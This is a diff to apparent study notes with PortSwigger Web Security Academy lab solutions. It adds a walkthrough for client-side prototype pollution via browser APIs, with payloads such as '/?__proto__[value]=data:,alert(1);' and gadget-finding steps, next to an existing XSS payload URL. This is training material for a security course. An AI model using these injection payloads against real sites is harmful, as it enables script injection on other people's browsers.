@@ -64,10 +64,32 @@ https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascrip
 ``` https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27 ```
 
 
-  **solution:** 
+
+## Client-side prototype pollution via browser APIs 
+
+**Chapter:**
+https://portswigger.net/web-security/prototype-pollution/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis
+  
+**Lab:**
+https://portswigger.net/web-security/prototype-pollution/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis
+  
+**Limitations:** NA
 
 
+**Solution:** 
+/?__proto__[value]=data:,alert(1);
 
+ Identify a gadget 
+ Observe that the next line uses the Object.defineProperty() method to make the transport_url unwritable and unconfigurable. However, notice that it doesn't define a value property. 
+ Craft an exploit
+ /?__proto__[value]=foo
+In the browser DevTools panel, go to the Elements tab and study the HTML content of the page. Observe that a <script> element has been rendered on the page, with the src attribute foo. 
+  
+ ### usign DOM invader
+  
+ Enable DOM Invader and enable the prototype pollution option. 
+ Scan for gadgets
+ Exploit
 
 
 
